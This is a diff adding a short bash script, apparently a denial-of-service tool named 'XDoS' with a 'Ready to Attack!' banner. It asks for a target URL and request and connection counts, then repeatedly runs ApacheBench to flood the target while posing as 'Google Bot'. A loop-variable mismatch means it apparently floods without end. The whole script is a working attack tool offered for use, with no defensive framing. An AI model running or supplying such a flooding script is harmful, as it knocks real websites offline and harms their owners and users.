@@ -1,0 +1,36 @@
+clear
+echo '''
+    
+▐▄• ▄ ·▄▄▄▄        .▄:▄ · 
+ █▌█▌▪██▪ ██ ▪     ▐█ ▀. 
+ ·██· ▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄
+▪▐█·█▌██. ██ ▐█▌.▐▌▐█▄▪▐█
+•▀▀ ▀▀▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ 
+    Ready to Attack!
+'''
+echo '-----------------'
+printf 'Circles of attack[up to 100000]:'
+read circles
+echo '-----------------'
+printf 'Quantity of requsts[up to 100000]:'
+read req
+echo '-----------------'
+printf 'Quantity of connections[up to 10000]:'
+read connect
+echo '-----------------'
+printf 'Target[with http:// or https://]:'
+read web
+echo '-----------------'
+printf 'Start attack?[Y/n]:'
+read question
+echo '-----------------'
+if [[ "$question" == "y" ]]
+then
+for (( i=1; a<circles; i++ ))
+do
+ab -n $req -c $connect -r -k -H "User-Agent: Google Bot" $web/
+done
+else
+clear
+echo 'Goodbye!'
+fi
